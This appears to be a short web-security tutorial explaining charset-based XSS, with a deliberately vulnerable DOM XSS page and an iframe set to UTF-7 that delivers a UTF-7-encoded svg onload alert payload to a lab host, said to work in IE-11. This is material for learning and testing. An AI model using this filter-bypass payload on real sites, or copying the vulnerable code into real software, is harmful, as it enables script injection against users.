---
title: Charset XSS
---

# Charset XSS

Charset XSS is useful in cases where application filters HTML special characters like `<` & `>`, You might have seen these characters converting back into `&gt;` & `&lt;` respectively.

For example consider the following codes

```text
<?php
if(isset($_GET['xss'])) {
    echo htmlspecialchars($_GET['xss']);
}
?>
```

and similarly for DOM XSS code

```text
<html>
    <head>
        <title>test page</title>
    </head>
    <body>
        <script>
            var bad_string = window.location.hash.substring(1);
            var regex = /<\>/gi;
            var good_string = bad_string.replace(regex,'')
            document.write(good_string);
        </script>
    </body>
</html>
```

using charset XSS it is possible to bypass html special characters filtration

## Requirements

* Target site not implemented charset
* Target site implemented the wrong charset

## Example works in IE-11

Consider the same DOM XSS code

{{< details xss.html open >}}

```text
<html>
    <head>
        <title>test page</title>
    </head>
    <body>
        <script>
            var bad_string = window.location.hash.substring(1);
            var regex = /<\>/gi;
            var good_string = bad_string.replace(regex,'')
            document.write(good_string);
        </script>
    </body>
</html>
```
{{< /details >}}

Since this page does not have any charset defines that means it fulfil the requirements for charset XSS. In order to do it, we will create a document with UTF-7 encoding and load the vulnerable URL in the iframe.

{{< details iframe.html open >}}
```text
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-7">
</head>
<body>
    <iframe src="http://lab.com:8888/common/c.html#<p>+ADw-svg/onload+AD0-alert(1444444)+AD4-</p>" frameborder="1"
        height="300" width="500"></iframe>
</body>
</html>
```
{{< /details >}}

As soon as we access iframe.html we triage javaScript code execution since xss.html doesn't have any charset defined and hence browser inherit top frame's charset which is UTF-7.

